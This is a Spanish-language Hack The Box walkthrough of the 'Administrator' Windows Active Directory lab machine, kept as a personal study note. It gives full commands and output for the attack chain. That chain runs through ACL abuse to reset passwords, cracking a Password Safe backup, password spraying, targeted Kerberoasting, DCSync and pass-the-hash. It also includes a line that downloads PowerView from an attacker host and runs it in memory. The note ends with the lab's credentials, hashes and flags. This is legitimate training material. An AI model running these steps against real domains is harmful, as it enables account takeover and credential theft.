---
tags:
  - type/writeup
  - asset/active-directory
  - env/windows
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/634
dificultad: Media
ip: 10.10.11.42
os: Windows
relacionados:
---
# HackTheBox - Administrator

## Reconocimiento 🕵️

Comencé mi fase de reconocimiento con un escaneo exhaustivo de puertos utilizando **Nmap** para identificar todos los servicios abiertos en la máquina.

Bash

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.42 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.11.42
```

El escaneo reveló servicios clave de **Active Directory**, como Kerberos (puerto 88), LDAP (puerto 389) y SMB (puerto 445), además de un servidor FTP en el puerto 21. El resultado de Nmap también me proporcionó el nombre de dominio `administrator.htb`, el cual agregué a mi archivo `/etc/hosts`.

Bash

```
echo "10.10.11.42 administrator.htb" | sudo tee -a /etc/hosts
```

Con las credenciales iniciales `Olivia:ichliebedich`, procedí a enumerar el controlador de dominio utilizando **BloodHound**. Para recolectar la información, utilicé el ingestor `bloodhound.py`, especificando las credenciales y el dominio.

Bash

```
python3 ~/tools/BloodHound.py/bloodhound.py -d administrator.htb -c All -u olivia -p 'ichliebedich' -ns 10.10.11.42 -k
```

Una vez que el ingestor generó los archivos JSON, inicié la base de datos `neo4j` y cargué los datos en la interfaz de BloodHound para visualizarlos. Al analizar los permisos de la usuaria `olivia`, descubrí que tenía privilegios `GenericAll` sobre el usuario `michael`.

---

## Explotación de vulnerabilidades 💥

### Abuso de ACL: Olivia → Michael

El permiso **GenericAll** me otorga control total sobre el objeto de usuario `michael`, lo que me permite, entre otras cosas, restablecer su contraseña. Esta es una configuración de permisos insegura (ACL) que puedo explotar directamente.

> [!IMPORTANT]
> 
> El privilegio GenericAll en Active Directory sobre un objeto de usuario es el nivel más alto de permiso. Permite realizar cualquier acción sobre ese objeto, incluyendo la modificación de sus atributos y el reseteo de su contraseña, lo que nos da control total sobre la cuenta.

Usando `evil-winrm`, me conecté como `olivia` y cambié la contraseña de `michael` con el comando `net user`, especificando el flag `/domain` para que el cambio se aplique a nivel de dominio.

PowerShell

```
evil-winrm -i 10.10.11.42 -u olivia -p 'ichliebedich'

*Evil-WinRM* PS C:\Users\olivia\Documents> net user michael nirza123 /domain
The command completed successfully.
```

### Movimiento Lateral: Michael → Benjamin → Emily

Con acceso como `michael`, volví a BloodHound para analizar sus permisos. Descubrí que `michael` tenía permisos `ForceChangePassword` sobre el usuario `benjamin`. Este permiso me permite forzar un cambio de contraseña sin conocer la actual.

Para explotar esto, me conecté como `michael` usando `evil-winrm` y utilicé **PowerView**, un potente script de PowerShell para la enumeración y abuso en Active Directory. Cargué el script en memoria y luego ejecuté los comandos para establecer una nueva contraseña para `benjamin`.

PowerShell

```
evil-winrm -i 10.10.11.42 -u michael -p 'nirza123'

*Evil-WinRM* PS C:\Users\michael\Documents> IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.4:4000/PowerView.ps1')
*Evil-WinRM* PS C:\Users\michael\Documents> $SecPassword = ConvertTo-SecureString 'nirza123' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\michael\Documents> $Cred = New-Object System.Management.Automation.PSCredential ('ADMINISTRATOR\michael', $SecPassword)
*Evil-WinRM* PS C:\Users\michael\Documents> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\michael\Documents> Set-DomainUserPassword -Identity benjamin -AccountPassword $UserPassword -Credential $Cred
```

Revisando la información de BloodHound, noté que `benjamin` pertenecía al grupo `Share Moderators`. Recordando el puerto 21 (FTP) abierto, intenté conectarme con las nuevas credenciales de `benjamin`.

Dentro del servidor FTP, encontré un archivo `Backup.psafe3`. Este tipo de archivo es una base de datos de **Password Safe**, una aplicación para almacenar contraseñas de forma segura.

Bash

```
ftp benjamin@10.10.11.42
ftp> dir
...
10-05-24  09:13AM                  952 Backup.psafe3
...
ftp> get Backup.psafe3
```

Descargué el archivo y procedí a crackear su contraseña maestra utilizando **Hashcat** con el modo `5200` y el diccionario `rockyou.txt`.

Bash

```
hashcat -a 0 -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
...
Backup.psafe3:tekieromucho
...
```

La contraseña resultó ser `tekieromucho`. Al abrir la base de datos, encontré una lista de credenciales de dominio. Para validar cuáles eran correctas, realicé un ataque de **password spraying** con `netexec` contra el servicio SMB.

Bash

```
# user.txt contiene los nombres de usuario
# pass.txt contiene las contraseñas encontradas

netexec smb 10.10.11.42 -u user.txt -p pass.txt
...
SMB         10.10.11.42     445    DC      [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
...
```

El ataque confirmó que las credenciales para la usuaria `emily` eran válidas. Finalmente, con estas credenciales, accedí por `evil-winrm` y capturé la bandera de usuario.

---

## Escalada de privilegios 👑

### Abuso de GenericWrite: Emily → Ethan (Targeted Kerberoasting)

El análisis en BloodHound reveló que `emily` poseía permisos `GenericWrite` sobre el usuario `ethan`.

> [!NOTE]
> 
> El permiso GenericWrite me permite modificar atributos no protegidos de un objeto de usuario. Un uso común para la escalada de privilegios es añadir un Service Principal Name (SPN) a la cuenta víctima. Al hacerlo, la cuenta se vuelve "kerberoastable", lo que significa que puedo solicitar un ticket de servicio Kerberos (TGS) para ella. La parte encriptada de este ticket está cifrada con el hash de la contraseña del usuario, el cual puedo intentar crackear offline.

Para realizar este ataque de **Kerberoasting dirigido**, utilicé el script `targetedKerberoast.py`.

Inicialmente, encontré un error `KRB_AP_ERR_SKEW`, que indica una desincronización de reloj entre mi máquina y el controlador de dominio.

> [!WARNING]
> 
> Error de Sincronización (Clock Skew)
> 
> Kerberos es muy sensible a la sincronización de tiempo. Si la diferencia horaria entre el cliente y el servidor es mayor a unos pocos minutos (generalmente 5), la autenticación falla. Sincronicé mi reloj con el del DC usando ntpdate.

Bash

```
sudo ntpdate 10.10.11.42
```

Tras sincronizar el reloj, volví a ejecutar el ataque, esta vez con éxito, obteniendo el hash del TGS para `ethan`.

Bash

```
python3 targetedKerberoast.py --dc-ip 10.10.11.42 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -U ethan.txt

$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*...
```

Procedí a crackear el hash con **Hashcat** (modo `13100`), obteniendo la contraseña de `ethan`: `limpbizkit`.

Bash

```
hashcat -a 0 -m 13100 ethan.hash /usr/share/wordlists/rockyou.txt
...
ethan:limpbizkit
...
```

### DCSync: Ethan → Administrator

Consultando nuevamente BloodHound, el camino más corto hacia Domain Admin mostraba que `ethan` tenía privilegios de **DCSync**.

Este privilegio (`GetChangesAll`) permite a una cuenta replicar cambios del directorio como si fuera un Controlador de Dominio. Esto me da la capacidad de solicitar los hashes de contraseña NTLM de cualquier usuario en el dominio, incluido el `Administrator`.

Utilicé `secretsdump.py` de Impacket con las credenciales de `ethan` para ejecutar el ataque DCSync.

Bash

```
secretsdump.py -just-dc ADMINISTRATOR.HTB/ethan:limpbizkit@10.10.11.42
...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
...
```

Con el hash NTLM del `Administrator`, realicé un ataque **Pass-the-Hash** usando `evil-winrm` para obtener una sesión como el administrador del dominio y capturar la bandera final.

Bash

```
evil-winrm -i 10.10.11.42 -u Administrator -H '3dc553ce4b9fd20bd016e098d2d2fd2e'

*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
```

---

## Vulnerabilidades y Conceptos Clave

- **Abuso de Listas de Control de Acceso (ACLs):** Se explotaron permisos mal configurados como `GenericAll`, `ForceChangePassword` y `GenericWrite` para moverse lateralmente y escalar privilegios.
    
- **Kerberoasting Dirigido:** Se abusó del permiso `GenericWrite` para establecer un SPN en un usuario y solicitar un TGS, cuyo hash fue crackeado para obtener su contraseña.
    
- **Ataque DCSync:** Se explotaron los privilegios de replicación de directorio para extraer los hashes de contraseña de todos los usuarios del dominio, logrando el control total.
    
- **Pass-the-Hash (PtH):** Se utilizó el hash NTLM de una cuenta privilegiada para autenticarse en un servicio sin necesidad de conocer la contraseña en texto plano.
    
- **Enumeración con BloodHound:** Herramienta fundamental para visualizar las relaciones y rutas de ataque en un entorno de Active Directory.


## Bandera(s)

> [!FLAG] `flag{user}`
> a63e68314d738fc17402cd1493d92688
^bandera

> [!FLAG] `flag{root}`
> 09789d70104162abe943561a80174b7f
^bandera